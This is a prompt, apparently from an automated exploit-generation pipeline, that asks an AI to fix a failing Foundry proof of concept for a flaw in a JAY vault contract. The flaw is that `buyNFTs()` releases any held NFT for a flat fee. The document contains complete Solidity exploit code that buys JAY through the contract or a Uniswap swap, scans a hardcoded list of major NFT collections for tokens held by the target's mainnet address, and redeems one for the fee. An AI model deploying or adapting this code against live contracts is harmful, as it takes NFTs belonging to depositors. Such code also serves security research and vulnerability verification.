You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Vault NFTs can be bought for the same flat fee regardless of collection or value
- claim: `buyNFTs()` lets callers name arbitrary ERC721/ERC1155 assets currently held by the contract, transfers them out, and only charges a count-based ETH fee plus a fixed `buyNftFeeJay` burn per unit. There is no whitelist, per-collection pricing, provenance tracking, or valuation check tying redemption cost to the NFT's actual market value.
- impact: Any valuable NFT deposited into the vault, whether through `buyJay()` or an accidental direct transfer, can be stolen for the same tiny flat fee used for worthless NFTs. This is direct loss of vault inventory and can wipe out NFT backing for the token.
- exploit_paths: ["A user deposits a valuable NFT into the contract through `buyJay()` or transfers it there directly.", "An attacker acquires only the fixed ETH and JAY fees required by `buyNFTs()`.", "The attacker calls `buyNFTs()` with that NFT's contract address and token id and receives the asset at the flat protocol fee."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IERC721Like {
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
}

interface IERC721EnumerableLike is IERC721Like {
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
}

interface IERC721AQueryableLike is IERC721Like {
    function tokensOfOwner(address owner) external view returns (uint256[] memory);
}

interface IWalletOfOwnerLike is IERC721Like {
    function walletOfOwner(address owner) external view returns (uint256[] memory);
}

interface IERC721ReceiverLike {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
}

interface IJAYLike is IERC20Like {
    function buyNFTs(
        address[] calldata erc721TokenAddress,
        uint256[] calldata erc721Ids,
        address[] calldata erc1155TokenAddress,
        uint256[] calldata erc1155Ids,
        uint256[] calldata erc1155Amounts
    ) external payable;

    function buyJayNoNFT() external payable;
    function getBuyJayNoNFT(uint256 amount) external view returns (uint256);
}

interface IUniswapV2Router02Like {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

contract FlawVerifier is IERC721ReceiverLike {
    error AlreadyExecuted();
    error InsufficientVerifierFunding(uint256 ethBalance, uint256 jayBalance);
    error NoEnumerableVaultInventoryFound();
    error RedemptionFailed(address token, uint256 tokenId);

    address public constant TARGET = 0xf2919D1D80Aff2940274014bef534f7791906FF2;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 public constant BUY_NFT_FEE_ETH = 0.01 ether;
    uint256 public constant BUY_NFT_FEE_JAY = 10 ether;

    bool public executed;
    address private _profitToken;
    uint256 private _profitAmount;
    address public stolenCollection;
    uint256 public stolenTokenId;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) revert AlreadyExecuted();
        executed = true;

        _ensureFunding();

        uint256 jayBalance = IERC20Like(TARGET).balanceOf(address(this));
        uint256 ethBalance = address(this).balance;
        if (jayBalance < BUY_NFT_FEE_JAY || ethBalance < BUY_NFT_FEE_ETH) {
            revert InsufficientVerifierFunding(ethBalance, jayBalance);
        }

        (address collection, uint256 tokenId) = _findVaultERC721();
        if (collection == address(0)) {
            revert NoEnumerableVaultInventoryFound();
        }

        _redeemERC721(collection, tokenId);

        if (IERC721Like(collection).ownerOf(tokenId) != address(this)) {
            revert RedemptionFailed(collection, tokenId);
        }

        stolenCollection = collection;
        stolenTokenId = tokenId;
        _profitToken = collection;
        _profitAmount = 1;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721ReceiverLike.onERC721Received.selector;
    }

    function _ensureFunding() internal {
        uint256 jayBalance = IERC20Like(TARGET).balanceOf(address(this));
        if (jayBalance >= BUY_NFT_FEE_JAY && address(this).balance >= BUY_NFT_FEE_ETH) {
            return;
        }

        if (address(this).balance <= BUY_NFT_FEE_ETH) {
            return;
        }

        uint256 spendableEth = address(this).balance - BUY_NFT_FEE_ETH;
        if (spendableEth == 0) {
            return;
        }

        uint256 currentJay = jayBalance;
        uint256 projectedJay = 0;
        try IJAYLike(TARGET).getBuyJayNoNFT(spendableEth) returns (uint256 quote) {
            projectedJay = quote;
        } catch {}

        if (currentJay + projectedJay < BUY_NFT_FEE_JAY) {
            _trySwapForJAY(spendableEth);
            return;
        }

        try IJAYLike(TARGET).buyJayNoNFT{value: spendableEth}() {
            return;
        } catch {
            _trySwapForJAY(spendableEth);
        }
    }

    function _trySwapForJAY(uint256 amountIn) internal {
        if (amountIn == 0) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = TARGET;

        try IUniswapV2Router02Like(UNISWAP_V2_ROUTER).swapExactETHForTokens{value: amountIn}(
            0,
            path,
            address(this),
            block.timestamp
        ) returns (uint256[] memory) {
            return;
        } catch {}
    }

    function _redeemERC721(address collection, uint256 tokenId) internal {
        address[] memory erc721TokenAddress = new address[](1);
        erc721TokenAddress[0] = collection;

        uint256[] memory erc721Ids = new uint256[](1);
        erc721Ids[0] = tokenId;

        address[] memory erc1155TokenAddress = new address[](0);
        uint256[] memory erc1155Ids = new uint256[](0);
        uint256[] memory erc1155Amounts = new uint256[](0);

        IJAYLike(TARGET).buyNFTs{value: BUY_NFT_FEE_ETH}(
            erc721TokenAddress,
            erc721Ids,
            erc1155TokenAddress,
            erc1155Ids,
            erc1155Amounts
        );
    }

    function _findVaultERC721() internal view returns (address collection, uint256 tokenId) {
        address[] memory candidates = _candidateCollections();
        for (uint256 index = 0; index < candidates.length; index++) {
            address candidate = candidates[index];
            if (candidate == address(0)) {
                continue;
            }

            try IERC721Like(candidate).balanceOf(TARGET) returns (uint256 balance) {
                if (balance == 0) {
                    continue;
                }

                try IERC721EnumerableLike(candidate).tokenOfOwnerByIndex(TARGET, 0) returns (uint256 foundTokenId) {
                    return (candidate, foundTokenId);
                } catch {}

                try IERC721AQueryableLike(candidate).tokensOfOwner(TARGET) returns (uint256[] memory tokenIds) {
                    if (tokenIds.length != 0) {
                        return (candidate, tokenIds[0]);
                    }
                } catch {}

                try IWalletOfOwnerLike(candidate).walletOfOwner(TARGET) returns (uint256[] memory walletTokenIds) {
                    if (walletTokenIds.length != 0) {
                        return (candidate, walletTokenIds[0]);
                    }
                } catch {}
            } catch {}
        }

        return (address(0), 0);
    }

    function _candidateCollections() internal pure returns (address[] memory collections) {
        collections = new address[](20);
        collections[0] = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
        collections[1] = 0x60E4d786628Fea6478F785A6d7e704777c86a7c6;
        collections[2] = 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;
        collections[3] = 0xED5AF388653567Af2F388E6224dC7C4b3241C544;
        collections[4] = address(0);
        collections[5] = 0x23581767a106ae21c074b2276D25e5C3e136a68b;
        collections[6] = 0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949;
        collections[7] = 0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7;
        collections[8] = 0xBd3531dA5CF5857e7CfAA92426877b022e612cf8;
        collections[9] = 0xe785E82358879F061BC3dcAC6f0444462D4b5330;
        collections[10] = 0x1A92f7381B9F03921564a437210bB9396471050C;
        collections[11] = 0x34d85c9CDeB23FA97cb08333b511ac86E1C4E258;
        collections[12] = 0x4297394c20800E8a38A619A243E9BbE7681Ff24E;
        collections[13] = 0xbCe3781ae7Ca1a5e050Bd9C4c77369867eBc307e;
        collections[14] = 0x6339e5E072086621540D0362C4e3Cea0d643E114;
        collections[15] = 0x8821BeE2ba0dF28761AffF119D66390D594CD280;
        collections[16] = 0x524cAB2ec69124574082676e6F654a18df49A048;
        collections[17] = 0x5Af0d9827dfA7f7CbD2EE83494613Df4D1B77C75;
        collections[18] = 0xFBeef911Dc5821886e1dda71586d90eD28174B7d;
        collections[19] = 0x59468516a8259058baD1cA5F8f4BFF190d30E066;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not contain any key anchors from paths; generated code does not cover paths indexes: 0, 1, 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
